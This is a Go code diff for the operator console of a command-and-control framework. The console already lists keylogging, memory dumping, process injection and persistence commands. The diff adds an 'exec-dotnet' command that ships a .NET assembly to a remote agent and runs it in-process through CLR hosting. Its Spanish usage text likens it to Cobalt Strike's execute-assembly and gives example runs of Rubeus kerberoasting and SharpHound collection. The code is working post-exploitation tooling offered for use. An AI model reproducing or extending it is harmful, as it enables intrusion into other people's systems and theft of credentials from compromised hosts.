@@ -56,7 +56,7 @@ var sessionCmds = []string{
 	"stage2", "bof", "results", "kill", "back",
 	"pwd", "cd", "ls", "mkdir", "rm", "env", "cat",
 	"ps", "screenshot", "inject", "token", "socks", "portfwd", "cleanup",
-	"persist", "forkrun", "inject-apc", "exec-asm",
+	"persist", "forkrun", "inject-apc", "exec-asm", "exec-dotnet",
 	"keylog", "clip",
 	"link", "rsocks", "httpivot", "winrm",
 	"minidump", "port-scan",
@@ -615,6 +615,14 @@ func (cl *CLI) dispatch(parts []string) {
 			return
 		}
 		cl.cmdExecAsm(parts[1:])
+
+	// ── inline .NET execution (native CLR host, in-process) ──────────────────
+	case "exec-dotnet":
+		cl.requireAgent()
+		if cl.current == "" {
+			return
+		}
+		cl.cmdExecDotnet(parts[1:])
 
 	// ── keylogger ─────────────────────────────────────────────────────────────
 	case "keylog":
@@ -1251,6 +1259,85 @@ func (cl *CLI) cmdExecAsm(args []string) {
 	}
 	encoded := base64.StdEncoding.EncodeToString(sc)
 	cl.cmdTask(cl.current, "FORK_RUN", process, []byte(encoded))
+}
+
+// ── exec-dotnet (native CLR host, in-process) ────────────────────────────
+
+const execDotnetUsage = `uso: exec-dotnet <assembly.exe> [args...] [--type <TypeName>] [--method <MethodName>]
+
+  Ejecuta un .NET assembly IN-PROCESS en el agente usando el CLR hosting nativo
+  (mscoree.dll COM API): ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost.
+
+  A diferencia de exec-asm (que convierte a shellcode con donut y usa fork-run),
+  exec-dotnet carga el CLR directamente en el proceso del agente y captura la
+  salida de Console.Write* mediante redirección de pipe.
+
+  Equivalente a: Cobalt Strike execute-assembly / Havoc dotnet inline-execute
+
+  --type   Nombre completo de la clase de entrada (autodetectado si se omite)
+           Ejemplo: --type Rubeus.Program
+  --method Nombre del método estático de entrada (default: Main)
+
+  Herramientas soportadas (autodetección): Rubeus, SharpHound, Certify,
+  SharpView, Seatbelt, InternalMonologue, SharpUp, ADRecon, etc.
+
+  Nota: requiere .NET Framework 4.x en el host Windows.
+
+ejemplos:
+  exec-dotnet /tmp/Rubeus.exe kerberoast /outfile:hashes.txt
+  exec-dotnet /tmp/SharpHound.exe -c All
+  exec-dotnet /tmp/Seatbelt.exe -group=all
+  exec-dotnet /tmp/Custom.exe --type MyNS.EntryClass --method Run arg1`
+
+func (cl *CLI) cmdExecDotnet(args []string) {
+	if len(args) == 0 {
+		fmt.Println(execDotnetUsage)
+		return
+	}
+
+	// Parse --type and --method flags; remaining args go to the assembly
+	var asmPath, typeName, methodName string
+	var asmArgs []string
+	i := 0
+	for i < len(args) {
+		switch args[i] {
+		case "--type":
+			if i+1 < len(args) {
+				i++
+				typeName = args[i]
+			}
+		case "--method":
+			if i+1 < len(args) {
+				i++
+				methodName = args[i]
+			}
+		default:
+			if asmPath == "" {
+				asmPath = args[i]
+			} else {
+				asmArgs = append(asmArgs, args[i])
+			}
+		}
+		i++
+	}
+
+	if asmPath == "" {
+		fmt.Println(execDotnetUsage)
+		return
+	}
+
+	data, err := os.ReadFile(asmPath)
+	if err != nil {
+		errLine("reading assembly: %s", err)
+		return
+	}
+
+	asmB64 := base64.StdEncoding.EncodeToString(data)
+	taskArgs := fmt.Sprintf(`{"asm":%q,"args":%q,"type":%q,"method":%q}`,
+		asmB64, strings.Join(asmArgs, " "), typeName, methodName)
+
+	info("exec-dotnet: %s%s%s (%d bytes) → in-process CLR", cBCyan, filepath.Base(asmPath), cReset, len(data))
+	cl.cmdTask(cl.current, "DOTNET_EXEC", taskArgs, nil)
 }
 
 // ── keylogger ─────────────────────────────────────────────────────────────
